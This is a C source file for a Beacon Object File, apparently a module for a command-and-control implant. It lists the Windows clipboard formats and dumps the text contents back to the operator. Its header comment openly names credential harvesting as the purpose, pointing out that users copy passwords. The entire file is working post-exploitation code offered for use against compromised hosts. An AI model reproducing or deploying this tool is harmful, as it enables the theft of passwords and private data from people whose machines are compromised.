// bof_clipboard.c — dump clipboard contents.
//
// Reads text from the Windows clipboard. Useful for credential harvesting
// and general OSINT — users often copy passwords, URLs, file paths, etc.
// Works from any session that has access to the clipboard.

#include "bof_api.h"

DECLSPEC_IMPORT BOOL WINAPI USER32$OpenClipboard(HWND hWndNewOwner);
DECLSPEC_IMPORT BOOL WINAPI USER32$CloseClipboard(VOID);
DECLSPEC_IMPORT UINT WINAPI USER32$EnumClipboardFormats(UINT format);
DECLSPEC_IMPORT HANDLE WINAPI USER32$GetClipboardData(UINT uFormat);
DECLSPEC_IMPORT BOOL WINAPI USER32$IsClipboardFormatAvailable(UINT format);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL hMem);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL hMem);
DECLSPEC_IMPORT SIZE_T WINAPI KERNEL32$GlobalSize(HGLOBAL hMem);

#define CF_TEXT         1
#define CF_UNICODETEXT  13
#define CF_HDROP        15

static void dump_text_format(UINT format, const char* name) {
    if (!USER32$IsClipboardFormatAvailable(format)) return;

    HANDLE data = USER32$GetClipboardData(format);
    if (!data) return;

    LPVOID ptr = KERNEL32$GlobalLock(data);
    if (!ptr) return;

    SIZE_T size = KERNEL32$GlobalSize(data);
    if (size > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[%s] %d bytes:\n", name, (int)size);

        if (format == CF_UNICODETEXT) {
            // Convert Unicode to ASCII (simple)
            wchar_t* wstr = (wchar_t*)ptr;
            char buffer[2048];
            int pos = 0;
            for (int i = 0; i < (int)(size/2) && pos < 2047; i++) {
                if (wstr[i] == 0) break;
                if (wstr[i] < 256) {
                    buffer[pos++] = (char)wstr[i];
                }
            }
            buffer[pos] = '\0';
            BeaconOutput(CALLBACK_OUTPUT, buffer, pos);
        } else {
            // ASCII text
            char* str = (char*)ptr;
            int len = 0;
            while (len < (int)size && str[len]) len++;
            BeaconOutput(CALLBACK_OUTPUT, str, len);
        }
    }

    KERNEL32$GlobalUnlock(data);
}

void go(char* args, int alen) {
    (void)args; (void)alen;

    if (!USER32$OpenClipboard(NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[clipboard] OpenClipboard failed\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[clipboard] Available formats:\n");

    // Enumerate all available formats
    UINT format = 0;
    int format_count = 0;
    while ((format = USER32$EnumClipboardFormats(format)) != 0) {
        format_count++;
        const char* format_name = "Unknown";
        switch (format) {
            case CF_TEXT:        format_name = "CF_TEXT"; break;
            case CF_UNICODETEXT: format_name = "CF_UNICODETEXT"; break;
            case CF_HDROP:       format_name = "CF_HDROP (files)"; break;
            case 2:              format_name = "CF_BITMAP"; break;
            case 3:              format_name = "CF_METAFILEPICT"; break;
            case 8:              format_name = "CF_DIB"; break;
            case 14:             format_name = "CF_ENHMETAFILE"; break;
            default:
                BeaconPrintf(CALLBACK_OUTPUT, "  Format %d\n", format);
                continue;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "  %s (format %d)\n", format_name, format);
    }

    if (format_count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "  (none)\n");
    } else {
        // Dump text formats
        dump_text_format(CF_TEXT, "ASCII Text");
        dump_text_format(CF_UNICODETEXT, "Unicode Text");

        // For file drops, show count
        if (USER32$IsClipboardFormatAvailable(CF_HDROP)) {
            BeaconPrintf(CALLBACK_OUTPUT, "\n[File Drop] Format available (use explorer.exe to see files)\n");
        }
    }

    USER32$CloseClipboard();
}